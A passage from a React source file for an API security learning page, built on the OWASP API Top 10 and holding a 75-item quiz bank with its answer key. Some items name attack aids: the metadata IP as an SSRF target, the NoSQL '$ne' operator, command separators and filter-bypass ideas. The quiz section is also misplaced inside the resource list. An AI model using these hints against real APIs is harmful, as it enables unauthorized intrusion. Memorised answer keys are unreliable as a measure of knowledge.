    topic: "Resource Consumption",
    question: "Unrestricted resource consumption includes:",
    options: ["Large pagination or expensive queries", "Using HTTPS", "JSON responses", "TLS 1.3"],
    correctAnswer: 0,
    explanation: "Expensive queries can exhaust resources without limits.",
  },
  {
    id: 16,
    topic: "SSRF",
    question: "SSRF commonly targets:",
    options: ["Internal services and metadata endpoints", "User browsers", "Public CDNs", "DNS only"],
    correctAnswer: 0,
    explanation: "SSRF can reach internal hosts and metadata services.",
  },
  {
    id: 17,
    topic: "SSRF",
    question: "The AWS metadata IP is:",
    options: ["169.254.169.254", "127.0.0.1", "10.0.0.1", "8.8.8.8"],
    correctAnswer: 0,
    explanation: "Cloud metadata often lives at 169.254.169.254.",
  },
  {
    id: 18,
    topic: "CORS",
    question: "The CORS header that controls allowed origins is:",
    options: ["Access-Control-Allow-Origin", "Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"],
    correctAnswer: 0,
    explanation: "Access-Control-Allow-Origin defines allowed origins.",
  },
  {
    id: 19,
    topic: "GraphQL",
    question: "GraphQL depth limits help prevent:",
    options: ["Resource exhaustion", "XSS", "CSRF", "SQL injection"],
    correctAnswer: 0,
    explanation: "Deep queries can be expensive without limits.",
  },
  {
    id: 20,
    topic: "GraphQL",
    question: "In production, GraphQL introspection should be:",
    options: ["Restricted or disabled", "Always enabled", "Exposed to all users", "Required for auth"],
    correctAnswer: 0,
    explanation: "Introspection can expose schema details.",
  },
  {
    id: 21,
    topic: "GraphQL",
    question: "Batching abuse can allow:",
    options: ["Bypassing rate limits", "Better caching", "Lower latency", "Stronger auth"],
    correctAnswer: 0,
    explanation: "Multiple operations in one request can evade limits.",
  },
  {
    id: 22,
    topic: "Injection",
    question: "The best defense against SQL injection is:",
    options: ["Parameterized queries", "Client-side validation", "String concatenation", "Hiding errors"],
    correctAnswer: 0,
    explanation: "Prepared statements prevent injection.",
  },
  {
    id: 23,
    topic: "Injection",
    question: "A common NoSQL injection operator is:",
    options: ["$ne", "UNION", "<script>", "../"],
    correctAnswer: 0,
    explanation: "Mongo operators like $ne can bypass filters.",
  },
  {
    id: 24,
    topic: "Injection",
    question: "Command injection often uses separators like:",
    options: ["; and &&", "? and &", "+ and -", "% and #"],
    correctAnswer: 0,
    explanation: "Shell separators chain commands.",
  },
  {
    id: 25,
    topic: "SSRF",
    question: "A common SSRF mitigation is:",
    options: ["Allowlist of hosts", "Blocking all HTTP", "Using GET only", "Disabling TLS"],
    correctAnswer: 0,
    explanation: "Allowlists restrict outbound destinations.",
  },
  {
    id: 26,
    topic: "Inventory",
    question: "Improper inventory management results in:",
    options: ["Undocumented or deprecated APIs exposed", "Strong authentication", "Automatic patching", "Fewer endpoints"],
    correctAnswer: 0,
    explanation: "Unknown endpoints are often unsecured.",
  },
  {
    id: 27,
    topic: "Supply Chain",
    question: "Unsafe consumption of APIs means:",
    options: ["Trusting upstream data without validation", "Always using HTTPS", "Enforcing MFA", "Using JSON"],
    correctAnswer: 0,
    explanation: "Upstream data should be validated and sanitized.",
  },
  {
    id: 28,
    topic: "Authentication",
    question: "JWT validation should always check:",
    options: ["Signature and expiration", "Only header", "Only payload", "Only issuer name"],
    correctAnswer: 0,
    explanation: "Signature and exp are critical for JWT security.",
  },
  {
    id: 29,
    topic: "Authentication",
    question: "Tokens should be revoked on:",
    options: ["Logout or password change", "Every request", "Page refresh", "DNS lookup"],
    correctAnswer: 0,
    explanation: "Revocation limits stolen token lifetimes.",
  },
  {
    id: 30,
    topic: "Authentication",
    question: "API keys should be:",
    options: ["Scoped and rotated", "Shared across apps", "Embedded in URLs", "Never revoked"],
    correctAnswer: 0,
    explanation: "Scope and rotation reduce key abuse.",
  },
  {
    id: 31,
    topic: "Logging",
    question: "Sensitive data in logs should be:",
    options: ["Masked or redacted", "Stored in plaintext", "Repeated in errors", "Printed to clients"],
    correctAnswer: 0,
    explanation: "Logs should avoid exposing secrets.",
  },
  {
    id: 32,
    topic: "Authentication",
    question: "HTTP 401 means:",
    options: ["Authentication required", "Forbidden", "Not found", "Server error"],
    correctAnswer: 0,
    explanation: "401 indicates missing or invalid authentication.",
  },
  {
    id: 33,
    topic: "Authorization",
    question: "HTTP 403 means:",
    options: ["Authenticated but forbidden", "Unauthenticated", "Bad request", "Not found"],
    correctAnswer: 0,
    explanation: "403 indicates the user lacks permission.",
  },
  {
    id: 34,
    topic: "Resource Consumption",
    question: "A common mitigation for scraping is:",
    options: ["Pagination limits", "Allow-all CORS", "Weak caching", "Removing auth"],
    correctAnswer: 0,
    explanation: "Pagination limits reduce data harvesting.",
  },
  {
    id: 35,
    topic: "Validation",
    question: "Schema validation helps:",
    options: ["Enforce types and required fields", "Encrypt data", "Speed up DNS", "Disable logging"],
    correctAnswer: 0,
    explanation: "Schema validation blocks unexpected input.",
  },
  {
    id: 36,
    topic: "Authorization",
    question: "Least privilege for API scopes means:",
    options: ["Grant only required permissions", "Grant admin to all", "No scopes at all", "Use shared keys"],
    correctAnswer: 0,
    explanation: "Scopes should match the minimum required access.",
  },
  {
    id: 37,
    topic: "Rate Limiting",
    question: "X-RateLimit-Remaining indicates:",
    options: ["Requests left in the window", "Total users", "Token expiry", "API version"],
    correctAnswer: 0,
    explanation: "It shows how many requests remain before limit is hit.",
  },
  {
    id: 38,
    topic: "Architecture",
    question: "An API gateway helps by:",
    options: ["Centralizing auth and rate limits", "Disabling TLS", "Removing logging", "Bypassing validation"],
    correctAnswer: 0,
    explanation: "Gateways standardize controls and monitoring.",
  },
  {
    id: 39,
    topic: "Replay",
    question: "Replay attacks are reduced by:",
    options: ["Nonces or idempotency keys", "Short URLs", "Large responses", "Disabling HTTPS"],
    correctAnswer: 0,
    explanation: "Unique tokens prevent request replays.",
  },
  {
    id: 40,
    topic: "Authentication",
    question: "Mutual TLS provides:",
    options: ["Client certificate authentication", "Faster DNS", "XSS protection", "SQLi protection"],
    correctAnswer: 0,
    explanation: "mTLS verifies both client and server identities.",
  },
  {
    id: 41,
    topic: "Transport",
    question: "HSTS enforces:",
    options: ["HTTPS-only access", "Token rotation", "CORS", "Session storage"],
    correctAnswer: 0,
    explanation: "HSTS tells browsers to always use HTTPS.",
  },
  {
    id: 42,
    topic: "Transport",
    question: "Recommended TLS minimum is:",
    options: ["TLS 1.2 or newer", "SSL 2.0", "SSL 3.0", "TLS 1.0"],
    correctAnswer: 0,
    explanation: "Older TLS/SSL versions are insecure.",
  },
  {
    id: 43,
    topic: "Errors",
    question: "Verbose error messages can expose:",
    options: ["Stack traces and internal details", "Stronger encryption", "Rate limits", "JWT expiry"],
    correctAnswer: 0,
    explanation: "Errors can leak sensitive implementation details.",
  },
  {
    id: 44,
    topic: "GraphQL",
    question: "Field-level authorization is required to:",
    options: ["Protect nested data access", "Enable CORS", "Disable introspection", "Fix TLS"],
    correctAnswer: 0,
    explanation: "GraphQL resolvers need auth checks at field level.",
  },
  {
    id: 45,
    topic: "Authorization",
    question: "A common BOLA test is to:",
    options: ["Change the object ID in a request", "Change User-Agent", "Disable TLS", "Remove headers"],
    correctAnswer: 0,
    explanation: "Swapping IDs reveals missing authorization checks.",
  },
  {
    id: 46,
    topic: "Authorization",
    question: "A common BFLA test is to:",
    options: ["Access admin endpoints as a normal user", "Rotate TLS keys", "Enable caching", "Use OPTIONS"],
    correctAnswer: 0,
    explanation: "BFLA often involves role-restricted functions.",
  },
  {
    id: 47,
    topic: "Rate Limiting",
    question: "A risky CORS setup is:",
    options: ["Reflecting any Origin with credentials", "Restricting to a single origin", "Disabling credentials", "Using preflight"],
    correctAnswer: 0,
    explanation: "Wildcard origins with credentials allow cross-site access.",
  },
  {
    id: 48,
    topic: "Detection",
    question: "Timing differences can indicate:",
    options: ["Blind injection or enumeration", "Stronger auth", "Better caching", "Lower latency"],
    correctAnswer: 0,
    explanation: "Response timing can reveal true/false conditions.",
  },
  {
    id: 49,
    topic: "Smuggling",
    question: "HTTP request smuggling relies on:",
    options: ["Parsing discrepancies between components", "Weak passwords", "Expired tokens", "Public buckets"],
    correctAnswer: 0,
    explanation: "Different parsers can desync requests.",
  },
  {
    id: 50,
    topic: "Smuggling",
    question: "A likely impact of request smuggling is:",
    options: ["Cache poisoning or auth bypass", "Better throughput", "Lower CPU usage", "Token refresh"],
    correctAnswer: 0,
    explanation: "Smuggling can poison caches or bypass auth.",
  },
  {
    id: 51,
    topic: "Authorization",
    question: "Broken access control often leads to:",
    options: ["Unauthorized data access", "Faster requests", "Better logging", "Lower costs"],
    correctAnswer: 0,
    explanation: "Missing checks expose data and functionality.",
  },
  {
    id: 52,
    topic: "Authentication",
    question: "Default credentials are dangerous because:",
    options: ["They are widely known and reused", "They are encrypted", "They rotate daily", "They require MFA"],
    correctAnswer: 0,
    explanation: "Default passwords are commonly guessed.",
  },
  {
    id: 53,
    topic: "Discovery",
    question: "A common directory brute force tool is:",
    options: ["ffuf", "tcpdump", "john", "aircrack-ng"],
    correctAnswer: 0,
    explanation: "ffuf is popular for content discovery.",
  },
  {
    id: 54,
    topic: "Discovery",
    question: "Subdomain enumeration tools include:",
    options: ["Amass or Subfinder", "Hashcat", "Wireshark", "Netcat"],
    correctAnswer: 0,
    explanation: "Amass and Subfinder enumerate subdomains.",
  },
  {
    id: 55,
    topic: "Authentication",
    question: "MFA fatigue attacks target:",
    options: ["Push notification prompts", "Password hashes", "TLS ciphers", "DNS records"],
    correctAnswer: 0,
    explanation: "Attackers spam push approvals.",
  },
  {
    id: 56,
    topic: "Tokens",
    question: "Tokens in URLs can leak via:",
    options: ["Referer headers and logs", "TLS handshakes", "DNS queries", "Cache keys"],
    correctAnswer: 0,
    explanation: "URLs are logged and sent as referrers.",
  },
  {
    id: 57,
    topic: "Sessions",
    question: "Good session management includes:",
    options: ["Idle and absolute timeouts", "No expiration", "Same session after logout", "URL tokens"],
    correctAnswer: 0,
    explanation: "Sessions should expire and be invalidated.",
  },
  {
    id: 58,
    topic: "Rate Limiting",
    question: "Best rate limiting is enforced:",
    options: ["Server-side", "Client-side only", "Only in docs", "Only on GET"],
    correctAnswer: 0,
    explanation: "Client-side limits can be bypassed.",
  },
  {
    id: 59,
    topic: "Authorization",
    question: "A common IDOR test is to:",
    options: ["Change an object ID in the request", "Change the User-Agent", "Clear cookies", "Switch HTTPS to HTTP"],
    correctAnswer: 0,
    explanation: "Swapping IDs reveals missing checks.",
  },
  {
    id: 60,
    topic: "Client Storage",
    question: "Storing JWTs in localStorage increases risk of:",
    options: ["XSS token theft", "SQL injection", "CSRF", "SSRF"],
    correctAnswer: 0,
    explanation: "XSS can read localStorage tokens.",
  },
  {
    id: 61,
    topic: "WAF",
    question: "Common WAF bypass techniques include:",
    options: ["Encoding and case variations", "Using HTTPS", "Shorter URLs", "Static content"],
    correctAnswer: 0,
    explanation: "Obfuscation can bypass naive filters.",
  },
  {
    id: 62,
    topic: "SSRF",
    question: "SSRF filters are often bypassed with:",
    options: ["DNS rebinding", "TLS 1.3", "Strong cookies", "CSP"],
    correctAnswer: 0,
    explanation: "DNS rebinding can evade IP-based checks.",
  },
  {
    id: 63,
    topic: "Injection",
    question: "Input validation should be:",
    options: ["Server-side and strict", "Client-side only", "Optional", "Disabled for APIs"],
    correctAnswer: 0,
    explanation: "Server-side validation is the authoritative control.",
  },
  {
    id: 64,
    topic: "Client",
    question: "Exposed API keys in client apps are risky because:",
    options: ["Anyone can reuse them", "They improve security", "They rotate automatically", "They require MFA"],
    correctAnswer: 0,
    explanation: "Client-side keys can be extracted and abused.",
  },
  {
    id: 65,
    topic: "CORS",
    question: "When using credentials, Access-Control-Allow-Origin should:",
    options: ["Be a specific origin", "Be *", "Be empty", "Match the Host header"],
    correctAnswer: 0,
    explanation: "Wildcard is invalid with credentials and unsafe.",
  },
  {
    id: 66,
    topic: "Business Logic",
    question: "A business logic flaw example is:",
    options: ["Manipulating price or quantity fields", "TLS downgrade", "SQLi", "Buffer overflow"],
    correctAnswer: 0,
    explanation: "Logic bugs abuse workflows and rules.",
  },
  {
    id: 67,
    topic: "Tokens",
    question: "JWT kid header attacks attempt to:",
    options: ["Load a malicious key", "Expire tokens", "Rotate secrets", "Improve caching"],
    correctAnswer: 0,
    explanation: "kid can be abused to select attacker-controlled keys.",
  },
  {
    id: 68,
    topic: "Sessions",
    question: "Session IDs should be:",
    options: ["Random and high entropy", "Sequential", "Usernames", "Timestamps"],
    correctAnswer: 0,
    explanation: "High entropy prevents guessing.",
  },
  {
    id: 69,
    topic: "Scope",
    question: "Security testing should be performed on:",
    options: ["Authorized, in-scope targets", "Any public IP", "Competitor APIs", "Unpatched systems"],
    correctAnswer: 0,
    explanation: "Testing must be authorized and scoped.",
  },
  {
    id: 70,
    topic: "Reporting",
    question: "A good report should include:",
    options: ["Impact, steps to reproduce, and remediation", "Only raw logs", "Only CVSS", "Only screenshots"],
    correctAnswer: 0,
    explanation: "Clear impact and remediation make reports actionable.",
  },
  {
    id: 71,
    topic: "Headers",
    question: "The CSP directive to control framing is:",
    options: ["frame-ancestors", "script-src", "img-src", "connect-src"],
    correctAnswer: 0,
    explanation: "frame-ancestors restricts framing sources.",
  },
  {
    id: 72,
    topic: "OAuth",
    question: "Open redirect issues can lead to:",
    options: ["Token leakage and phishing", "Better caching", "Stronger auth", "Improved UX"],
    correctAnswer: 0,
    explanation: "Redirects can send tokens to attacker domains.",
  },
  {
    id: 73,
    topic: "GraphQL",
    question: "GraphQL errors can leak:",
    options: ["Schema details and stack traces", "JWT secrets", "DNS records", "TLS keys"],
    correctAnswer: 0,
    explanation: "Errors may expose schema and internal details.",
  },
  {
    id: 74,
    topic: "TLS",
    question: "Certificate validation prevents:",
    options: ["Man-in-the-middle attacks", "SQL injection", "XSS", "CSRF"],
    correctAnswer: 0,
    explanation: "Validating certificates blocks MITM attacks.",
  },
  {
    id: 75,
    topic: "Monitoring",
    question: "Monitoring should alert on:",
    options: ["Authentication failures and anomalies", "All successful logins", "Static content", "Empty responses"],
    correctAnswer: 0,
    explanation: "Auth anomalies are strong indicators of abuse.",
  },
];


function TopicAccordion({ topics }: { topics: TopicSection[] }) {
  const theme = useTheme();

  return (
    <>
      {topics.map((topic, index) => (
        <Accordion
          key={topic.title}
          defaultExpanded={index === 0}
          sx={{
            mb: 2,
            border: `1px solid ${alpha(topic.color, 0.2)}`,
            borderRadius: "12px !important",
            "&:before": { display: "none" },
            overflow: "hidden",
          }}
        >
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            sx={{
              borderLeft: `4px solid ${topic.color}`,
              "&:hover": { bgcolor: alpha(topic.color, 0.02) },
            }}
          >
            <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
              <Box
                sx={{
                  width: 40,
                  height: 40,
                  borderRadius: 2,
                  bgcolor: alpha(topic.color, 0.1),
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: topic.color,
                }}
              >
                {topic.icon}
              </Box>
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700 }}>
                  {topic.title}
                </Typography>
                <Typography variant="body2" color="text.secondary" sx={{ display: { xs: "none", sm: "block" } }}>
                  {topic.description}
                </Typography>
              </Box>
            </Box>
          </AccordionSummary>
          <AccordionDetails sx={{ pt: 0 }}>
            <Grid container spacing={3}>
              {/* Key Points */}
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: topic.color }}>
                  📋 Key Points
                </Typography>
                <List dense disablePadding>
                  {topic.keyPoints.map((point, i) => (
                    <ListItem key={i} disableGutters sx={{ py: 0.5 }}>
                      <ListItemIcon sx={{ minWidth: 28 }}>
                        <CheckCircleIcon sx={{ fontSize: 16, color: topic.color }} />
                      </ListItemIcon>
                      <ListItemText primary={point} primaryTypographyProps={{ variant: "body2" }} />
                    </ListItem>
                  ))}
                </List>
              </Grid>

              {/* Techniques */}
              <Grid item xs={12} md={6}>
                {topic.techniques && (
                  <Box sx={{ mb: 3 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "warning.main" }}>
                      ⚡ Techniques
                    </Typography>
                    <Paper
                      sx={{
                        p: 2,
                        bgcolor: alpha(theme.palette.warning.main, 0.03),
                        border: `1px solid ${alpha(theme.palette.warning.main, 0.15)}`,
                        borderRadius: 2,
                      }}
                    >
                      {topic.techniques.map((technique, i) => (
                        <Typography
                          key={i}
                          variant="body2"
                          sx={{
                            fontFamily: "monospace",
                            fontSize: "0.8rem",
                            mb: i < topic.techniques!.length - 1 ? 1 : 0,
                          }}
                        >
                          → {technique}
                        </Typography>
                      ))}
                    </Paper>
                  </Box>
                )}

                {topic.tools && (
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1.5 }}>
                      🛠️ Tools
                    </Typography>
                    <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                      {topic.tools.map((tool) => (
                        <Chip
                          key={tool}
                          label={tool}
                          size="small"
                          sx={{
                            bgcolor: alpha(topic.color, 0.1),
                            color: topic.color,
                            fontWeight: 500,
                          }}
                        />
                      ))}
                    </Box>
                  </Box>
                )}
              </Grid>

              {/* Code Example */}
              {topic.codeExample && (
                <Grid item xs={12}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>
                    💻 Example
                  </Typography>
                  <CodeBlock code={topic.codeExample} />
                </Grid>
              )}

              {/* Tips */}
              {topic.tips && (
                <Grid item xs={12}>
                  <Alert
                    severity="info"
                    icon={<InfoIcon />}
                    sx={{
                      borderRadius: 2,
                      "& .MuiAlert-message": { width: "100%" },
                    }}
                  >
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                      💡 Pro Tips
                    </Typography>
                    <List dense disablePadding>
                      {topic.tips.map((tip, i) => (
                        <ListItem key={i} disableGutters sx={{ py: 0.25 }}>
                          <Typography variant="body2">• {tip}</Typography>
                        </ListItem>
                      ))}
                    </List>
                  </Alert>
                </Grid>
              )}
            </Grid>
          </AccordionDetails>
        </Accordion>
      ))}
    </>
  );
}

export default function ApiSecurityPage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const [tabValue, setTabValue] = useState(0);
  const [quizPool] = useState<QuizQuestion[]>(() =>
    selectRandomQuestions(quizQuestions, QUIZ_QUESTION_COUNT)
  );

  const pageContext = `This page provides a comprehensive guide to API security testing based on OWASP API Security Top 10. Topics include API discovery and enumeration, authentication testing (API keys, JWT attacks, OAuth vulnerabilities), authorization testing (BOLA/IDOR, BFLA), injection attacks (SQL, NoSQL, SSRF, command injection), data exposure and mass assignment, rate limiting bypass techniques, and GraphQL-specific security testing including introspection and query complexity attacks.`;

  return (
    <LearnPageLayout pageTitle="API Security Testing" pageContext={pageContext}>
    <Container maxWidth="lg" sx={{ py: 4 }}>
      {/* Back Button */}
      <Chip
        component={Link}
        to="/learn"
        icon={<ArrowBackIcon />}
        label="Back to Learning Hub"
        clickable
        variant="outlined"
        sx={{ borderRadius: 2, mb: 3 }}
      />

      {/* Header */}
      <Box sx={{ mb: 5 }}>
        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <Box
            sx={{
              width: 64,
              height: 64,
              borderRadius: 3,
              background: `linear-gradient(135deg, #3b82f6, #8b5cf6)`,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxShadow: `0 8px 32px ${alpha("#3b82f6", 0.3)}`,
            }}
          >
            <ApiIcon sx={{ fontSize: 32, color: "white" }} />
          </Box>
          <Box>
            <Typography
              variant="h3"
              sx={{
                fontWeight: 800,
                background: `linear-gradient(135deg, #3b82f6, #8b5cf6)`,
                backgroundClip: "text",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
              }}
            >
              API Security Testing
            </Typography>
            <Typography variant="h6" color="text.secondary">
              Comprehensive guide to REST, GraphQL, and API vulnerability testing
            </Typography>
          </Box>
        </Box>
      </Box>

      {/* Stats */}
      <Grid container spacing={2} sx={{ mb: 4 }}>
        {[
          { value: "8", label: "Sections", color: "#3b82f6" },
          { value: "25+", label: "Attack Types", color: "#ef4444" },
          { value: "50+", label: "Techniques", color: "#f59e0b" },
          { value: "OWASP", label: "API Top 10", color: "#10b981" },
        ].map((stat) => (
          <Grid item xs={6} md={3} key={stat.label}>
            <Paper
              sx={{
                p: 2.5,
                textAlign: "center",
                borderRadius: 3,
                border: `1px solid ${alpha(stat.color, 0.2)}`,
                background: `linear-gradient(135deg, ${alpha(stat.color, 0.05)}, transparent)`,
              }}
            >
              <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>
                {stat.value}
              </Typography>
              <Typography variant="body2" color="text.secondary">
                {stat.label}
              </Typography>
            </Paper>
          </Grid>
        ))}
      </Grid>

      {/* OWASP API Top 10 Reference */}
      <Alert
        severity="info"
        sx={{ mb: 4, borderRadius: 3 }}
      >
        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
          📚 Based on OWASP API Security Top 10 (2023)
        </Typography>
        <Typography variant="body2">
          This guide covers: API1:BOLA, API2:Broken Authentication, API3:BOPLA, API4:Unrestricted Resource Consumption,
          API5:BFLA, API6:SSRF, API7:Security Misconfiguration, API8:Lack of Protection, API9:Improper Inventory Management, API10:Unsafe Consumption
        </Typography>
      </Alert>

      {/* Tabs */}
      <Paper sx={{ borderRadius: 3, overflow: "hidden" }}>
        <Tabs
          value={tabValue}
          onChange={(_, v) => setTabValue(v)}
          variant="scrollable"
          scrollButtons="auto"
          sx={{
            bgcolor: alpha(theme.palette.background.paper, 0.8),
            borderBottom: `1px solid ${theme.palette.divider}`,
            "& .MuiTab-root": {
              minHeight: 64,
              textTransform: "none",
              fontWeight: 600,
            },
          }}
        >
          {tabSections.map((section, i) => (
            <Tab
              key={section.label}
              label={
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <Box sx={{ color: tabValue === i ? section.color : "text.secondary" }}>
                    {section.icon}
                  </Box>
                  {section.label}
                </Box>
              }
            />
          ))}
        </Tabs>

        <Box sx={{ p: 3 }}>
          <TabPanel value={tabValue} index={0}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              🔍 API Discovery & Enumeration
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Before testing, you need to find and map all API endpoints, understand the technology stack,
              and gather documentation.
            </Typography>
            <TopicAccordion topics={discoveryTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={1}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              🔐 Authentication Testing
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Test API authentication mechanisms including API keys, JWTs, OAuth, and session management
              for common vulnerabilities.
            </Typography>
            <TopicAccordion topics={authTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={2}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              🛡️ Authorization Testing (BOLA/BFLA)
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Broken Object Level Authorization (BOLA) and Broken Function Level Authorization (BFLA)
              are the #1 and #5 API security risks. Test thoroughly!
            </Typography>
            <TopicAccordion topics={authzTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={3}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              💉 Injection Attacks
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Test API parameters, headers, and request bodies for SQL injection, NoSQL injection,
              command injection, and SSRF.
            </Typography>
            <TopicAccordion topics={injectionTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={4}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              👁️ Data Exposure & Mass Assignment
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              APIs often return more data than needed or allow modification of restricted fields.
              Look for sensitive data leaks and mass assignment vulnerabilities.
            </Typography>
            <TopicAccordion topics={dataTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={5}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              ⚡ Rate Limiting & Resource Exhaustion
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Test API rate limiting implementation and look for bypass techniques.
              Also test for denial of service through resource exhaustion.
            </Typography>
            <TopicAccordion topics={rateLimitTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={6}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              💜 GraphQL Security
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              GraphQL has unique attack vectors including introspection, query complexity attacks,
              batching abuse, and authorization bypass through nested queries.
            </Typography>
            <TopicAccordion topics={graphqlTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={7}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              ✅ API Security Testing Checklist
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Use this checklist to ensure comprehensive coverage during your API security assessments.
            </Typography>
            <Grid container spacing={3}>
              {checklistItems.map((category) => (
                <Grid item xs={12} sm={6} md={4} key={category.category}>
                  <Card
                    sx={{
                      height: "100%",
                      borderTop: `4px solid ${category.color}`,
                      borderRadius: 2,
                    }}
                  >
                    <CardContent>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: category.color }}>
                        {category.category}
                      </Typography>
                      {category.items.map((item) => (
                        <Box key={item} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                          <Box
                            sx={{
                              width: 18,
                              height: 18,
                              border: `2px solid ${alpha(category.color, 0.3)}`,
                              borderRadius: 0.5,
                              flexShrink: 0,
                            }}
                          />
                          <Typography variant="body2">{item}</Typography>
                        </Box>
                      ))}
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </TabPanel>
        </Box>
      </Paper>

      {/* Resources */}
      <Paper sx={{ mt: 4, p: 4, borderRadius: 3, bgcolor: alpha(theme.palette.info.main, 0.02) }}>
        <Typography variant="h5" sx={{ fontWeight: 700, mb: 3 }}>
          📚 Essential API Security Resources
        </Typography>
        <Grid container spacing={2}>
          {[
            { name: "OWASP API Security Top 10", url: "https://owasp.org/API-Security/", desc: "Official OWASP API security risks" },
            { name: "PortSwigger API Testing", url: "https://portswigger.net/web-security/api-testing", desc: "Free labs for API security testing" },
            { name: "API Security Checklist", url: "https://github.com/shieldfy/API-Security-Checklist", desc: "Comprehensive API security checklist" },
            { name: "GraphQL Security", url: "https://graphql.org/learn/security/", desc: "Official GraphQL security guidance" },
            { name: "JWT.io", url: "https://jwt.io/", desc: "JWT debugger and library reference" },
            { name: "Kiterunner", url: "https://github.com/assetnote/kiterunner", desc: "API endpoint discovery tool" },
          ].map((resource) => (
            <Grid item xs={12} sm={6} key={resource.name}>
              <Paper
                sx={{
                  p: 2,
                  borderRadius: 2,
                  border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                  cursor: "pointer",
                  transition: "all 0.2s",
                  "&:hover": {
                    borderColor: "primary.main",
                    transform: "translateY(-2px)",
                  },
                }}
                onClick={() => window.open(resource.url, "_blank")}
              >
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "primary.main" }}>
                  {resource.name} ↗
                </Typography>
                <Typography variant="body2" color="text.secondary">
                  {resource.desc}
                </Typography>
              </Paper>

      {/* Quiz Section */}
      <Box id="quiz" sx={{ mt: 5 }}>
        <QuizSection
          questions={quizPool}
          accentColor={ACCENT_COLOR}
          title="API Security Knowledge Check"
          description="Random 10-question quiz drawn from a 75-question bank each time the page loads."
          questionsPerQuiz={QUIZ_QUESTION_COUNT}
        />
      </Box>

            </Grid>
          ))}
        </Grid>
      </Paper>

      {/* Bottom Navigation */}
      <Box sx={{ mt: 4, textAlign: "center" }}>
        <Button
          variant="outlined"
          startIcon={<ArrowBackIcon />}
          onClick={() => navigate("/learn")}
          sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
        >
          Back to Learning Hub
        </Button>
      </Box>
    </Container>
    </LearnPageLayout>
  );
}
